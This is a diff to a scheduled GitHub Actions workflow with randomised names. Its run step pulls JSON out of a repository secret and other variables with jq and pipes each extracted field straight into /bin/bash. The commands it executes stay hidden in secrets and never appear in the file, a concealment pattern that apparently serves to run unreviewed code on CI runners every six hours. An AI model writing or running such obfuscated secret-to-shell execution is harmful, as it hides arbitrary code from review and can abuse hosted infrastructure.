@@ -2,7 +2,8 @@ name: weihuanpeng1987
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 1/6 * * *'
+    - cron: '46 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,12 +12,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: weihuanpeng1987
         env:
-          cbl2694: ${{ secrets.cbl2694 }}
+          n40956: ${{ secrets.n40956 }}
         run: |
-          echo $cbl2694 | jq -r .od3 | /bin/bash
-          echo $rfs2377 | jq -r .afthx91 | /bin/bash
-          echo $fg820 | jq -r .na6 | /bin/bash
-          echo $f0 | jq -r .ebl25 | /bin/bash
-          echo $bgtq2 | jq -r .pwue82 | /bin/bash
-          echo $h77 | jq -r .dgeyf890 | /bin/bash
+          echo $n40956 | jq -r .b9 | /bin/bash
+          echo $q86 | jq -r .ej51 | /bin/bash
+          echo $vuezc08597 | jq -r .hcg9245 | /bin/bash
+          echo $awqt95485 | jq -r .or568 | /bin/bash
+          echo $cyc260 | jq -r .sjcsa527 | /bin/bash
+          echo $vpf4 | jq -r .r38054 | /bin/bash
+          echo $oikef52797 | jq -r .z4 | /bin/bash
+          echo $owzlp49100 | jq -r .r40 | /bin/bash
 
